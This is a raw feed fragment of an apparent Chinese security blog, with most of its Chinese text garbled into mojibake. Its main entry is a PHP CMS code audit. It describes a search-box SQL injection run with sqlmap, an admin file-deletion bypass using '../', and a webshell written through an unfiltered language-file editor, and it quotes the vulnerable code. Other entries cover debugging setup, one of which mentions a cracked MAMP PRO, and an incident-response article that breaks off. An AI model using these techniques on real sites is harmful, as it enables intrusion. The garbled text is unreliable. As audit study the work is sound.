class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸºæœ¬éƒ½ç»è¿‡äº†å¸¦æœ‰è¿‡æ»¤çš„å‡½æ•°å¤„ç†ã€‚æ‰€ä»¥åƒï¼ŒSQLæ³¨å…¥å’ŒXSS è¿™ç§éœ€è¦æ„é€ ç‰¹æ®Šç¬¦å·çš„æ¼æ´å‡ ä¹å¾ˆéš¾äº†</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>åŸºäºåŠŸèƒ½ç‚¹å»æµ‹ï¼Œå…ˆé«˜å±åä½å±ã€‚åå°ä¸€èˆ¬é˜²å¾¡è¾ƒå¼±ï¼Œä»åå°çªç ´è¾ƒå®¹æ˜“ã€‚è€Œåå°å­˜åœ¨çš„åŠŸèƒ½æœ‰ï¼šå›¾ç‰‡ã€æ–‡ä»¶ã€æ¨¡æ¿ç®¡ç†ã€åˆ é™¤ã€ç•™è¨€å®¡æ ¸ï¼Œç­‰å…¶ä»–åŠŸèƒ½ã€‚</p><h2 id="å‰å°æœç´¢æ¡†SQL-æ³¨å…¥"><a href="#å‰å°æœç´¢æ¡†SQL-æ³¨å…¥" class="headerlink" title="å‰å°æœç´¢æ¡†SQL æ³¨å…¥"></a>å‰å°æœç´¢æ¡†SQL æ³¨å…¥</h2><p>å¼€å¯MySQL ç›‘æ§ï¼Œç„¶åå†æœç´¢æ¡†è¿›è¡Œæœç´¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>å¦‚å›¾ï¼Œ123ï¼Œè¢«å¸¦å…¥SQLè¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå•å¼•å·é—­åˆã€‚å°†å…³é”®å­—åœ¨æ•´ä¸ªæ–‡ä»¶å¤¹ä¸­æœç´¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>è¿™é‡Œå…ˆrawurldecode è§£ç ï¼Œç„¶åå¸¦å…¥æ‹¼æ¥è¿›å…¥æŸ¥è¯¢ã€‚</p><p>ç„¶åä¸‹æ–­ç‚¹è¿›è¡Œåˆ†æï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>ç›´æ¥ä¸Šsqlmapã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>æ­¤å¤„é‡‡ç”¨äº†ç™½åå•çš„å½¢å¼ï¼Œåªèƒ½åˆ é™¤ æŒ‡å®šçš„ä¸‰ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ä½†æ˜¯å¿½ç•¥äº†å¯ä»¥ç”¨<code>../</code>æ¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr ä»ç¬¬<code>$path</code>çš„ç¬¬ä¸€ä¸ªå­—æ¯å¼€å§‹å¾€ååˆ¤æ–­ï¼Œæˆªå–pathå‰åŠéƒ¨åˆ†é•¿åº¦å’Œç™½åå•æ˜¯å¦ç›¸ç­‰ï¼Œå³æ˜¯å¦æ˜¯ç™½åå•é‡Œçš„é‚£å‡ ä¸ªç›®å½•ï¼Œæ˜¯ï¼Œç„¶å<code>unlink</code>åˆ é™¤æ‰ã€‚</p><p>æˆåŠŸåˆ é™¤æ–‡ä»¶æ—¶ï¼Œè¿”å›1ã€‚</p><p>è¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸ªåŸŸåæ˜¯é€šè¿‡MAMPä¿®æ”¹çš„æœ¬åœ°HOSTSæ–‡ä»¶è§£æçš„ï¼Œç„¶åæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œ<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0ï¼Œç®€å•è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="æ¼æ´æ¼”ç¤º"></p><h2 id="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"><a href="#åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell" class="headerlink" title="åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell"></a>åå°ç¼–è¾‘è¯­è¨€æ–‡ä»¶è®¾ç½®GetShell</h2><p>æˆåŠŸç¼–è¾‘åï¼Œå›æ˜¾ ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸã€‚é‚£ä¹ˆåœ¨æ•´ä¸ªæ–‡ä»¶ä¸­æœç´¢å³å¯å®šä½åˆ°ä»£ç ã€‚<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;ç¼–è¾‘è¯­è¨€åŒ…æˆåŠŸ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;è¿”å›ä¸Šä¸€é¡µ&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥å‡½æ•°ä¸­ï¼Œç»è¿‡<code>post()</code> å‡½æ•°è¿‡æ»¤ï¼Œä½†æ˜¯å¯¹äº<code>$lang_text</code> çš„è¿‡æ»¤è§„åˆ™æ˜¯<code>no_filter</code> ï¼Œè·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹è¯¥è§„åˆ™ã€‚</p><p>/include/function.php,104è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸è¿‡æ»¤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// åˆ é™¤åæ–œæ </span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ <code>$lang_text</code> å°±é€šè¿‡<code>file_put_contents</code> å†™å…¥æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å†™WebShellã€‚</p><p>åŒæ ·çš„ï¼Œä¸‹æ–­ç‚¹æ¥è°ƒè¯•åˆ†æã€‚</p><p>step into ï¼Œæ…¢æ…¢ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå†™å…¥webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> å¯æ§çš„ï¼Œè¿™é‡Œåªéœ€è¦æŠŠ<code>$path</code> æ”¹ä¸ºä¸€ä¸ª<code>.php</code> åç¼€çš„å°±å¯ä»¥GetShell äº†ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="å®¡è®¡æ€»ç»“"><a href="#å®¡è®¡æ€»ç»“" class="headerlink" title="å®¡è®¡æ€»ç»“"></a>å®¡è®¡æ€»ç»“</h1><p>åŸºæœ¬ä¸Šæ˜¯ç…§æ¬ç…§æŠ„åˆ«äººçš„æ€è·¯æ¥æçš„ï¼Œæ€»æ¯”èººç€ç©æ‰‹æœºå¼ºï¼Œä¹Ÿé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚Burp Suite è®¾ç½® åŸŸåå’Œip ç»‘å®šï¼Œphpstorm è°ƒè¯•åˆ†æï¼Œæ€»ä¹‹ï¼Œèƒ½å­¦åˆ°ä¸œè¥¿å°±è¡Œã€‚å­¦åˆ°äº†æ€è·¯ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¤ç°thinkphp çš„å†å²æ¼æ´ï¼Œå’Œthinkcmf æˆ–è€…å…¶ä»–phpæ¡†æ¶çš„å†å²æ¼æ´ï¼Œå­¦ä¹ å®Œä¹‹åå°±å»æ‰¾cmsè¿›è¡Œå®æˆ˜ï¼ï¼ˆå…¶å®è¿™ä¸ªå·²ç»æç½®äº†å¿«åŠå¹´äº†ã€‚</p><blockquote><p>ä¸€ä¸ªä¸èƒ½å­œå­œä¸å€¦ï¼Œå§‹ç»ˆå¤„äºæ–°çŸ¥è¯†ã€æ–°æŠ€æœ¯å­¦ä¹ çŠ¶æ€ä¸‹çš„å®‰å…¨çˆ±å¥½è€…ï¼Œå¿…ç„¶ä¼šè¢«è¶…è¶Šå’Œå–ä»£ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;ä»£ç å®¡è®¡å¸¸è§çš„ä¸‰ç§æ–¹æ³•ï¼ˆPHPç¯‡ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>MacOS ä¸‹é…ç½®PHPä»£ç å®¡è®¡ç¯å¢ƒï¼ŒPHPè°ƒè¯•å­¦ä¹ </title>
    <link href="https://hack-for.fun/4fd81e40.html"/>
    <id>https://hack-for.fun/4fd81e40.html</id>
    <published>2020-09-11T12:34:13.000Z</published>
    <updated>2020-09-11T15:56:23.844Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ç¯å¢ƒé…ç½®å‚è€ƒæ–‡ç« ï¼š<a href="https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2">https://www.sqlsec.com/2020/07/macphp.html#toc-heading-2</a></p><blockquote><p>æ‰€éœ€Appï¼š</p><p>MAMP PRO ï¼Œæˆ‘æ˜¯åœ¨Google é‡Œæ‰¾çš„Cracked Version</p><p>PHPStorm / Vscode</p></blockquote><p>MAMP ä¸­çš„ <code>php.ini</code> è®¾ç½®</p><p>åœ¨åˆ‡æ¢phpç‰ˆæœ¬æ—¶éœ€æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œå…å¾—debug ç¯å¢ƒå‡ºé”™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable&#x3D;1</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_autostart&#x3D;1</span><br><span class="line">xdebug.profiler_enable&#x3D;0</span><br><span class="line">xdebug.profiler_output_dir&#x3D;&quot;&#x2F;Applications&#x2F;MAMP&#x2F;tmp&quot;</span><br><span class="line">xdebug.idekey&#x3D;&quot;my_key&quot;</span><br></pre></td></tr></table></figure><p>å‡ºç°ä¸‹å›¾çš„æƒ…å†µï¼Œè¯´æ˜Debug é…ç½®æ­£å¸¸ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911203443.png" alt="image-20200911203438853"></p><hr><blockquote><p>æ¨èå°†æ•´ä¸ªä»£ç å®¡è®¡çš„è·¯å¾„è®¾ç½®æˆProject, æ¯”å¦‚:  xxx/www/xxx</p><p>ç„¶åMAMP å’Œ PhpStorm çš„è®¾ç½®è¦ä¸€è‡´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222248.png" alt="image-20200911204652392"></p><h1 id="å•ä¸ªæ–‡ä»¶è°ƒè¯•"><a href="#å•ä¸ªæ–‡ä»¶è°ƒè¯•" class="headerlink" title="å•ä¸ªæ–‡ä»¶è°ƒè¯•"></a>å•ä¸ªæ–‡ä»¶è°ƒè¯•</h1><p>æµ‹è¯•Debug æ˜¯å¦æˆåŠŸï¼šåœ¨ç¬¬å››è¡Œï¼Œå˜é‡å­—ç¬¦ä¸²æ‹¼æ¥çš„åœ°æ–¹ï¼Œä¸‹ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•ã€‚ç»“æœå¦‚å›¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222425.png" alt="image-20200911205830698"></p><h1 id="æ•´ä¸ªæ–‡ä»¶å¤¹-ç½‘ç«™ç›®å½•-è°ƒè¯•"><a href="#æ•´ä¸ªæ–‡ä»¶å¤¹-ç½‘ç«™ç›®å½•-è°ƒè¯•" class="headerlink" title="æ•´ä¸ªæ–‡ä»¶å¤¹(ç½‘ç«™ç›®å½•)è°ƒè¯•"></a>æ•´ä¸ªæ–‡ä»¶å¤¹(ç½‘ç«™ç›®å½•)è°ƒè¯•</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222559.png" alt="image-20200911210726371"></p><blockquote><p>å…³é”®æ˜¯é€‰æ‹©ä¸‹é¢çš„Server å³å¯ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222713.png" alt="image-20200911210857642"></p><p>PHPMyadmin éœ€è¦php  5.5+ , cms å®‰è£…æ—¶ï¼Œæ•°æ®åº“åœ¨phpmyadmin ä¸­åˆ›å»ºå³å¯ã€‚</p><p>è¿™é‡Œä»¥å›½å…‰å¸ˆå‚…æ–‡ç« çš„cmsï¼Œåå°è¯­è¨€è®¾ç½®GetShellï¼Œæ¥æµ‹è¯•ã€‚</p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36">https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36</a></p><p>åœ¨ 149 è¡Œä¸‹æ–­ç‚¹è°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222146.png"></p><p>å¯ç›´æ¥åœ¨<code>$lang_text</code> ä¸­ä¿®æ”¹å€¼å³å¯è¿›è¡Œè°ƒè¯•ã€‚</p><p>Burp Suite æŠ“åŒ…çš„è¯·æ±‚åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222725.png" alt="image-20200911220557034"></p><h1 id="æ–‡ä»¶ç›‘æ§"><a href="#æ–‡ä»¶ç›‘æ§" class="headerlink" title="æ–‡ä»¶ç›‘æ§"></a>æ–‡ä»¶ç›‘æ§</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222737.png" alt="image-20200911213334993"></p><h1 id="MySQL-ç›‘æ§"><a href="#MySQL-ç›‘æ§" class="headerlink" title="MySQL ç›‘æ§"></a>MySQL ç›‘æ§</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222752.png" alt="image-20200911214143396"></p><p>éœ€è¦ä¿®æ”¹<code>config.ini</code> ä¸­çš„æ•°æ®åº“ä¸ºä¹‹å‰cms åˆ›å»ºçš„æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[dbconf]</span><br><span class="line">host&#x3D;localhost</span><br><span class="line">port&#x3D;8889</span><br><span class="line">user&#x3D;root</span><br><span class="line">password&#x3D;root</span><br><span class="line">db_name&#x3D;test</span><br><span class="line">charset&#x3D;utf8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222811.png" alt="image-20200911214903921"></p><p>ä½¿ç”¨DataGrip è¿æ¥MySQL æ—¶çš„ç›‘æ§æ—¥å¿—</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223609.png" alt="image-20200911215237610"></p><h2 id="DataGrip-è¿æ¥æ•°æ®åº“"><a href="#DataGrip-è¿æ¥æ•°æ®åº“" class="headerlink" title="DataGrip è¿æ¥æ•°æ®åº“"></a>DataGrip è¿æ¥æ•°æ®åº“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222823.png" alt="image-20200911215449398"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223553.png" alt="image-20200911215526972"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223540.png" alt="image-20200911215342544"></p><h1 id="VsCode-é…ç½®"><a href="#VsCode-é…ç½®" class="headerlink" title="VsCode é…ç½®"></a>VsCode é…ç½®</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911234844.png" alt="image-20200911234023142"></p><p>VScode å•æ­¥è°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911235149.png" alt="image-20200911233946444"></p><p>ç»ˆäºä¼šè°ƒè¯•äº†~ </p><p>ä¸‹ä¸€æ­¥å°±æ˜¯å»å®Œæ•´ä»£ç å®¡è®¡ä¸€ä¸‹è¿™ä¸ªCMS~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ç¯å¢ƒé…ç½®å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.sqlsec.com/2020/07/</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>WAF Bypass å§¿åŠ¿æ€»ç»“</title>
    <link href="https://hack-for.fun/66043e4c.html"/>
    <id>https://hack-for.fun/66043e4c.html</id>
    <published>2020-09-11T05:39:04.000Z</published>
    <updated>2020-09-11T15:56:23.845Z</updated>
    
    
    
    
    
    <category term="æ¸—é€æµ‹è¯•" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF-XSS</title>
    <link href="https://hack-for.fun/fb2051a0.html"/>
    <id>https://hack-for.fun/fb2051a0.html</id>
    <published>2020-09-09T08:46:34.000Z</published>
    <updated>2020-09-11T15:56:23.841Z</updated>
    
    <content type="html"><![CDATA[<p>xssï¼š<a href="http://xssaq.com/wooyun/">http://xssaq.com/wooyun/</a></p><p>xss ç»ƒä¹ å¹³å°ï¼š<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;xssï¼š&lt;a href=&quot;http://xssaq.com/wooyun/&quot;&gt;http://xssaq.com/wooyun/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xss ç»ƒä¹ å¹³å°ï¼š&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;http://xss-quiz.</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SSTI</title>
    <link href="https://hack-for.fun/936f84c6.html"/>
    <id>https://hack-for.fun/936f84c6.html</id>
    <published>2020-09-07T08:41:29.000Z</published>
    <updated>2020-09-11T15:56:23.843Z</updated>
    
    
    
    
    
    <category term="SSTI" scheme="https://hack-for.fun/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Windows æœåŠ¡å™¨åº”æ€¥å“åº”</title>
    <link href="https://hack-for.fun/54449ea6.html"/>
    <id>https://hack-for.fun/54449ea6.html</id>
    <published>2020-09-07T08:40:08.000Z</published>
    <updated>2020-09-11T15:56:23.847Z</updated>
    
    
    
    
    
    <category term="Linuxåº”æ€¥å“åº”" scheme="https://hack-for.fun/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linux æœåŠ¡å™¨åº”æ€¥å“åº”</title>
    <link href="https://hack-for.fun/e312198e.html"/>
    <id>https://hack-for.fun/e312198e.html</id>
    <published>2020-09-04T15:32:31.000Z</published>
    <updated>2020-09-07T08:40:36.620Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼š2020å¹´æœŸé—´æœ‰å¹¸å‚åŠ äº†æŠ¤ç½‘ï¼Œå®¢æˆ·åœ¨æ¼”ä¹ é˜¶æ®µå‡ºç°äº†ä¸€æ¬¡åº”æ€¥äº‹ä»¶ï¼ŒWindowsçš„é‚®ä»¶æœåŠ¡å™¨å‡ºç°äº†ä¸€ä¸ªéšè—ç”¨æˆ·å¼‚åœ°ç™»å½•â€¦â€¦ å½“æ—¶å®¢æˆ·æœ‰ç‚¹æƒ…ç»ªï¼ŒåŠ ä¹‹æˆ‘ä»¬è¿™è¾¹ç¡®å®éƒ½æ˜¯æ“…é•¿æ¸—é€ã€æŒ–æ´çš„å¸ˆå‚…ä»¬ï¼Œæ‰€ä»¥åº”æ€¥çš„æ—¶å€™æ˜¾å¾—å¾ˆé™Œç”Ÿï¼Œæ‰‹å¿™è„šä¹±ï¼Œç”šè‡³å¯ä»¥è¯´å¾ˆä¸šä½™ã€‚äºæ˜¯æ‰“ç®—è®¤çœŸçš„æŒ‰ç…§ç½‘ä¸Šä¸€äº›å…³äºåº”æ€¥å“åº”çš„èµ„æ–™æ¥å¤ç°ä¸€ä¸‹ï¼Œç†Ÿæ‚‰ä¸€äº›åŸºæœ¬çš„ä¸œè¥¿ã€‚ç®—æ˜¯æŒæ¡ä¸€ä¸‹å¸¸è¯†å¥½äº†ã€‚</p></blockquote><blockquote><p>æ‰€æœ‰å‚è€ƒèµ„æ–™ä»…ç”¨äºå­¦ä¹ </p></blockquote><p>Version1: å‚è€ƒï¼šBypass å¸ˆå‚…çš„é¡¹ç›®ï¼š<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h1 id="Linux-å…¥ä¾µæ’æŸ¥"><a href="#Linux-å…¥ä¾µæ’æŸ¥" class="headerlink" title="Linux å…¥ä¾µæ’æŸ¥"></a>Linux å…¥ä¾µæ’æŸ¥</h1><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>å½“ä¼ä¸šå‘ç”Ÿé»‘å®¢å…¥ä¾µã€ç³»ç»Ÿå´©æºƒæˆ–å…¶å®ƒå½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œçš„å®‰å…¨äº‹ä»¶æ—¶ï¼Œæ€¥éœ€ç¬¬ä¸€æ—¶é—´è¿›è¡Œå¤„ç†ï¼Œä½¿ä¼ä¸šçš„ç½‘ç»œä¿¡æ¯ç³»ç»Ÿåœ¨æœ€çŸ­æ—¶é—´å†…æ¢å¤æ­£å¸¸å·¥ä½œï¼Œè¿›ä¸€æ­¥æŸ¥æ‰¾å…¥ä¾µæ¥æºï¼Œè¿˜åŸå…¥ä¾µäº‹æ•…è¿‡ç¨‹ï¼ŒåŒæ—¶ç»™å‡ºè§£å†³æ–¹æ¡ˆä¸é˜²èŒƒæªæ–½ï¼Œä¸ºä¼ä¸šæŒ½å›æˆ–å‡å°‘ç»æµæŸå¤±ã€‚</p><p>é’ˆå¯¹å¸¸è§çš„æ”»å‡»äº‹ä»¶ï¼Œç»“åˆå·¥ä½œä¸­åº”æ€¥å“åº”äº‹ä»¶åˆ†æå’Œè§£å†³çš„æ–¹æ³•ï¼Œæ€»ç»“äº†ä¸€äº›LinuxæœåŠ¡å™¨å…¥ä¾µæ’æŸ¥çš„æ€è·¯ã€‚</p><h3 id="0x01-å…¥ä¾µæ’æŸ¥æ€è·¯"><a 